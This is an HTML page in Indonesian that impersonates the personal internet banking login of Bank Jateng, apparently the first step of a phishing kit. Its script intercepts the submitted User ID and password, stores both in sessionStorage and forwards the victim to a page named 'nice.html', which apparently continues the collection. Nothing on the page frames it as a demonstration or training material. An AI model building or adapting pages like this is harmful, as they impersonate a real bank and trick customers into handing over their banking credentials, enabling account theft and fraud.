<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Form Data - Langkah 1</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial,Helvetica,sans-serif;
}

body{
    background:#eef4ff;
    display:flex;
    justify-content:center;
    align-items:center;
    min-height:75vh;
}

.container{
    width:360px;
    background:#fff;
    border-radius:8px;
    overflow:hidden;
    box-shadow:0 10px 25px rgba(0,0,0,.15);
}

.header{
    background:linear-gradient(180deg,#1D4A7A,#13A29B);
    color:#fff;
    text-align:center;
    padding:35px 20px;
}

.logo-bank{
    width:100px;
    height:auto;
    display: block;
    margin-bottom:0px;
  }

.content{
    padding:20px;
}

label{
    display:block;
    margin-bottom:6px;
    color:#444;
    font-size:14px;
}

input{
    width:100%;
    padding:12px;
    margin-bottom:15px;
    border:1px solid #ccc;
    border-radius:4px;
    font-size:14px;
}

button{
    width:100%;
    padding:14px;
    background:#F4B41A;
    color:#fff;
    border:none;
    border-radius:4px;
    font-size:16px;
    cursor:pointer;
}

button:hover{
    opacity:.9;
}

.footer{
    text-align:center;
    padding:15px;
    color:#777;
    font-size:12px;
}
</style>

</head>
<body>

<div class="container">
<div class="header">
<img src="images/bankjateng.jpg" alt="logo" class="logo-bank"
<h2></h2>
<p>Internet Banking Personal Bank Jateng</p>
</div>

<div class="content">

<form id="form1">

<label>User ID</label>
<input type="text" id="userid" placeholder="Masukkan User ID" required>

<label>Password</label>
<input type="password" id="password" placeholder="Masukkan Password" required>

<button type="submit">Masuk</button>

</form>

</div>

<div class="footer">
Versi 1.0.0
</div>

</div>

<script>
document.getElementById("form1").addEventListener("submit", function(e){

    e.preventDefault();

    sessionStorage.setItem("userid", document.getElementById("userid").value);
    sessionStorage.setItem("password", document.getElementById("password").value);

    window.location.href = "nice.html";

});
</script>

</body>
</html>
